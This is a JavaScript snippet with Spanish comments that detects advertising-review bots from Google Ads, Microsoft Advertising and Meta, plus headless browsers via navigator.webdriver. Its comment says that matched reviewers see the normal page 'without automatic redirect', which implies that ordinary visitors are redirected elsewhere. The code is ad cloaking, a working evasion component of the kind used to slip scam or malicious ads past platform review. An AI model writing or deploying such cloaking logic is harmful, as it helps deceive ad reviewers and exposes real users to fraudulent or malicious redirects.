/* Bots de revisión: Google Ads, Microsoft Advertising y Facebook/Meta.
   Si coinciden, se muestra la página normal (sin redirección automática). */

(function (g) {
  g.BOT_REVISION_RE = new RegExp(
    [
      "googlebot",
      "googlebot-image",
      "googlebot-video",
      "googlebot-news",
      "adsbot-google-mobile-apps",
      "adsbot-google-mobile",
      "adsbot-google",
      "mediapartners-google",
      "google-inspectiontool",
      "storebot-google",
      "googleother",
      "google-safety",
      "google-extended",
      "google-cloudvertexbot",
      "google-read-aloud",
      "duplexweb-google",
      "feedfetcher-google",
      "apis-google",
      "googleproducer",
      "google-site-verification",
      "google-adwords",
      "google-ads",
      "googleassociation",
      "google-amphtml",
      "google-pagerenderer",
      "chrome-lighthouse",
      "pagespeed",
      "headlesschrome",
      "adidxbot",
      "bingbot",
      "bingpreview",
      "microsoftpreview",
      "msnbot-media",
      "msnbot",
      "skypeuripreview",
      "linkedinbot",
      "bingads",
      "microsoft-advertising",
      "facebookexternalhit",
      "facebookcatalog",
      "facebookbot",
      "facebot",
      "meta-externalads",
      "meta-externalagent",
      "meta-externalfetcher",
      "meta-webindexer"
    ].join("|"),
    "i"
  );

  g.esBotRevision = function (ua) {
    ua = String(ua || (g.navigator && g.navigator.userAgent) || "");
    if (g.BOT_REVISION_RE.test(ua)) return true;
    if (g.navigator && g.navigator.webdriver) return true;
    return false;
  };
})(typeof window !== "undefined" ? window : globalThis);
